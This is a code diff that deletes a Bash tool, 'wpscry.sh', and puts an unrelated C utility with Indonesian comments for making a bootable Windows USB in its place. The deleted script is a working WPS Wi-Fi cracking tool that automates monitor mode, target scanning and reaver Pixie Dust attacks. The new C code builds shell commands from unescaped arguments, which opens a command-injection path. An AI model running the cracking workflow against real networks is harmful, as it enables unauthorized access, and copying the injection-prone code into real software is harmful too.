@@ -1,171 +1,122 @@
-#!/bin/bash
-# [wpscry.sh] - Optimized Version
-#--------------------------------------------------------------------------------
-# Automated WPS Wi-Fi Cracking - For educational purposes only.
-# Author: Rofi (fixploit03) | GitHub: https://github.com/fixploit03/WPSCRY
-# Optimized by: [Grok 3 - xAI]
-#--------------------------------------------------------------------------------
-# Warning: Use only on networks you own or have explicit permission to test.
-#--------------------------------------------------------------------------------
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <getopt.h>
 
-# Colors for output
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-BLUE='\033[0;34m'
-NC='\033[0m' # No Color
+// Struktur untuk menyimpan argumen
+struct Arguments {
+    char *device;        // Perangkat flashdisk (contoh: /dev/sdb)
+    char *isoMountPoint; // Direktori ISO diekstrak
+    char *mountPoint;    // Direktori mount flashdisk
+};
 
-# Log file
-LOG_FILE="wpscry_$(date +%Y%m%d_%H%M%S).log"
-
-# Check root privileges
-check_root() {
-    [[ $EUID -ne 0 ]] && { echo -e "${RED}[-] This script must be run as root!${NC}"; exit 1; }
+// Fungsi untuk menampilkan bantuan
+void printHelp() {
+    printf("Penggunaan: sudo ./make_bootable_usb [OPSI]\n");
+    printf("Membuat bootable flashdisk untuk instalasi Windows di Linux.\n\n");
+    printf("Opsi:\n");
+    printf("  -d, --device=DEVICE       Perangkat flashdisk (contoh: /dev/sdb)\n");
+    printf("  -i, --iso=PATH           Direktori tempat ISO Windows diekstrak (contoh: /mnt/windows_iso)\n");
+    printf("  -m, --mount=PATH         Direktori mount untuk flashdisk (contoh: /mnt/usb)\n");
+    printf("  -h, --help               Tampilkan bantuan ini\n\n");
+    printf("Contoh: sudo ./make_bootable_usb --device=/dev/sdb --iso=/mnt/windows_iso --mount=/mnt/usb\n");
+    printf("Catatan: Jalankan dengan sudo, pastikan ms-sys terinstal untuk boot sector Windows.\n");
 }
 
-# Display warning
-warning() {
-    echo -e "${BLUE}#######################################################################${NC}"
-    echo -e "# ${RED}Warning${NC}                                                           #"
-    echo -e "# Usage of this script is your sole responsibility.                   #"
-    echo -e "# Designed for educational purposes. Unauthorized access is illegal!  #"
-    echo -e "${BLUE}#######################################################################${NC}"
-    echo ""
-    read -p "[#] Proceed? [Y/n]: " confirm
-    [[ "$confirm" =~ ^[Nn]$ ]] && { echo "[*] Goodbye!"; exit 0; }
-    [[ ! "$confirm" =~ ^[YyNn]$ ]] && { echo -e "${RED}[-] Invalid input!${NC}"; warning; }
-}
+int main(int argc, char *argv[]) {
+    struct Arguments args = {NULL, NULL, NULL};
 
-# Check required tools
-check_tools() {
-    local tools=("reaver" "airmon-ng" "iwconfig" "iw" "pixiewps" "wash")
-    local missing=()
-    for tool in "${tools[@]}"; do
-        command -v "$tool" >/dev/null || missing+=("$tool")
-    done
-    if [[ ${#missing[@]} -gt 0 ]]; then
-        echo -e "${RED}[-] Missing tools:${NC}"
-        printf '%s\n' "${missing[@]}"
-        exit 1
-    fi
-}
+    // Definisi opsi untuk getopt_long
+    static struct option long_options[] = {
+        {"device", required_argument, 0, 'd'},
+        {"iso", required_argument, 0, 'i'},
+        {"mount", required_argument, 0, 'm'},
+        {"help", no_argument, 0, 'h'},
+        {0, 0, 0, 0}
+    };
 
-# Show current time
-show_time() {
-    echo -e "${BLUE}[$(date +'%A, %e %B %Y - %H:%M:%S')]${NC}"
-}
+    int opt;
+    int option_index = 0;
 
-# Display banner
-banner() {
-    clear
-    show_time
-    echo "╦ ╦  ╔═╗  ╔═╗  ╔═╗  ╦═╗  ╦ ╦"
-    echo "║║║  ╠═╝  ╚═╗  ║    ╠╦╝  ╚╦╝"
-    echo "╚╩╝  ╩    ╚═╝  ╚═╝  ╩╚═   ╩ "
-    echo -e "${GREEN}Optimized WPSCRY by fixploit03 & Grok${NC}"
-}
+    // Parsing argumen
+    while ((opt = getopt_long(argc, argv, "d:i:m:h", long_options, &option_index)) != -1) {
+        switch (opt) {
+            case 'd':
+                args.device = optarg;
+                break;
+            case 'i':
+                args.isoMountPoint = optarg;
+                break;
+            case 'm':
+                args.mountPoint = optarg;
+                break;
+            case 'h':
+                printHelp();
+                return 0;
+            default:
+                printHelp();
+                return 1;
+        }
+    }
 
-# Select Wi-Fi interface using numbers
-select_interface() {
-    local interfaces=($(iw dev | grep -w 'Interface' | awk '{print $2}'))
-    [[ ${#interfaces[@]} -eq 0 ]] && { echo -e "${RED}[-] No Wi-Fi interfaces found!${NC}"; exit 1; }
-    echo "Available Wi-Fi interfaces:"
-    for i in "${!interfaces[@]}"; do
-        echo "[$((i+1))] ${interfaces[$i]}"
-    done
-    read -p "[#] Select interface number (1-${#interfaces[@]}): " choice
-    [[ ! "$choice" =~ ^[1-9][0-9]*$ || $choice -lt 1 || $choice -gt ${#interfaces[@]} ]] && { echo -e "${RED}[-] Invalid choice!${NC}"; select_interface; }
-    iwifi="${interfaces[$((choice-1))]}"
-    echo -e "${GREEN}[+] Selected: $iwifi${NC}"
-}
+    // Validasi argumen
+    if (!args.device || !args.isoMountPoint || !args.mountPoint) {
+        fprintf(stderr, "Error: Semua opsi --device, --iso, dan --mount harus disediakan.\n");
+        printHelp();
+        return 1;
+    }
 
-# Enable monitor mode
-enable_monitor() {
-    airmon-ng check kill &>/dev/null
-    [[ $(iwconfig "$iwifi" 2>/dev/null | grep -w 'Mode:Monitor') ]] && { echo -e "${GREEN}[+] $iwifi is already in monitor mode${NC}"; return; }
-    echo "[*] Enabling monitor mode on $iwifi..."
-    airmon-ng start "$iwifi" &>/dev/null
-    [[ $? -eq 0 ]] && { iwifi=$(iw dev | grep -w 'Interface' | grep -w "${iwifi}mon" || echo "$iwifi"); echo -e "${GREEN}[+] Monitor mode enabled: $iwifi${NC}"; } || { echo -e "${RED}[-] Failed to enable monitor mode${NC}"; exit 1; }
-}
+    char command[512];
 
-# Scan for WPS-enabled networks
-scan_wps() {
-    echo "[*] Scanning for WPS-enabled Wi-Fi (CTRL+C to stop)..."
-    wash -i "$iwifi" -o wps_scan.txt &>/dev/null &
-    local pid=$!
-    trap "kill $pid 2>/dev/null; echo -e '\n[*] Scan stopped'; cat wps_scan.txt" SIGINT
-    wait $pid
-    trap - SIGINT
-    echo "Scan results saved to wps_scan.txt"
-    cat wps_scan.txt | tee -a "$LOG_FILE"
-}
+    // Langkah 1: Membuat partisi baru menggunakan parted
+    printf("Membuat partisi baru di %s...\n", args.device);
+    snprintf(command, sizeof(command), "parted -s %s mklabel msdos mkpart primary ntfs 1MiB 100%% set 1 boot on", args.device);
+    if (system(command) != 0) {
+        fprintf(stderr, "Gagal membuat partisi!\n");
+        return 1;
+    }
 
-# Select target from scan results
-select_target() {
-    local targets=($(awk '/^[0-9A-Fa-f:]{17}/ {print $1","$2}' wps_scan.txt))
-    [[ ${#targets[@]} -eq 0 ]] && { echo -e "${RED}[-] No WPS targets found${NC}"; exit 1; }
-    echo "Available WPS targets:"
-    for i in "${!targets[@]}"; do
-        IFS=',' read -r bssid channel <<< "${targets[$i]}"
-        echo "[$((i+1))] BSSID: $bssid | Channel: $channel"
-    done
-    read -p "[#] Select target number (1-${#targets[@]}) or 'all': " choice
-    if [[ "$choice" == "all" ]]; then
-        target_list=("${targets[@]}")
-    else
-        [[ ! "$choice" =~ ^[1-9][0-9]*$ || $choice -lt 1 || $choice -gt ${#targets[@]} ]] && { echo -e "${RED}[-] Invalid choice${NC}"; select_target; }
-        IFS=',' read -r bssid channel <<< "${targets[$((choice-1))]}"
-        target_list=("$bssid,$channel")
-    fi
-}
+    // Langkah 2: Memformat partisi sebagai NTFS
+    printf("Memformat partisi sebagai NTFS...\n");
+    snprintf(command, sizeof(command), "mkfs.ntfs -f %s1", args.device);
+    if (system(command) != 0) {
+        fprintf(stderr, "Gagal memformat partisi!\n");
+        return 1;
+    }
 
-# Configure attack options
-configure_attack() {
-    echo "Verbose modes: [0] None, [1] Basic, [2] Detailed, [3] Very detailed"
-    read -p "[#] Select verbose mode (default 0): " mode
-    case "$mode" in
-        1) verbose="-v" ;;
-        2) verbose="-vv" ;;
-        3) verbose="-vvv" ;;
-        *) verbose="" ;;
-    esac
-    read -p "[#] Use Pixie Dust attack? [N/y]: " pixie
-    [[ "$pixie" =~ ^[Yy]$ ]] && pixie_opt="--pixie-dust" || pixie_opt=""
-}
+    // Langkah 3: Membuat direktori mount dan mount partisi
+    printf("Mounting flashdisk ke %s...\n", args.mountPoint);
+    snprintf(command, sizeof(command), "mkdir -p %s && mount %s1 %s", args.mountPoint, args.device, args.mountPoint);
+    if (system(command) != 0) {
+        fprintf(stderr, "Gagal mount flashdisk!\n");
+        return 1;
+    }
 
-# Execute the attack
-run_attack() {
-    for target in "${target_list[@]}"; do
-        IFS=',' read -r bssid channel <<< "$target"
-        local session="session_${bssid}_$(date +%H%M%S).txt"
-        echo -e "${GREEN}[*] Attacking BSSID: $bssid | Channel: $channel${NC}"
-        reaver -i "$iwifi" -b "$bssid" -c "$channel" -s "$session" $verbose $pixie_opt | tee -a "$LOG_FILE" &
-        local pid=$!
-        wait $pid
-        [[ -f "$session" ]] && rm "$session"
-    done
-}
+    // Langkah 4: Menyalin file ISO ke flashdisk
+    printf("Menyalin file ISO ke flashdisk...\n");
+    snprintf(command, sizeof(command), "rsync -av --progress %s/ %s/", args.isoMountPoint, args.mountPoint);
+    if (system(command) != 0) {
+        fprintf(stderr, "Gagal menyalin file!\n");
+        snprintf(command, sizeof(command), "umount %s", args.mountPoint);
+        system(command);
+        return 1;
+    }
 
-# Cleanup
-cleanup() {
-    echo "[*] Cleaning up..."
-    airmon-ng stop "$iwifi" &>/dev/null
-    systemctl start NetworkManager 2>/dev/null
-    echo -e "${GREEN}[+] Done, log saved to $LOG_FILE${NC}"
-}
+    // Langkah 5: Menulis MBR untuk boot Windows (opsional, memerlukan ms-sys)
+    printf("Menulis MBR untuk boot Windows...\n");
+    snprintf(command, sizeof(command), "ms-sys -7 %s", args.device);
+    if (system(command) != 0) {
+        printf("Peringatan: Gagal menulis MBR (pastikan ms-sys terinstal). Flashdisk mungkin tidak bootable.\n");
+    }
 
-# Main function
-main() {
-    check_root
-    warning
-    check_tools
-    banner
-    select_interface
-    enable_monitor
-    scan_wps
-    select_target
-    configure_attack
-    run_attack
-    cleanup
-}
+    // Langkah 6: Unmount flashdisk
+    printf("Unmount flashdisk...\n");
+    snprintf(command, sizeof(command), "umount %s", args.mountPoint);
+    if (system(command) != 0) {
+        fprintf(stderr, "Gagal unmount flashdisk!\n");
+        return 1;
+    }
 
-main
+    printf("Proses selesai! Flashdisk sekarang siap untuk instalasi Windows.\n");
+    return 0;
+}
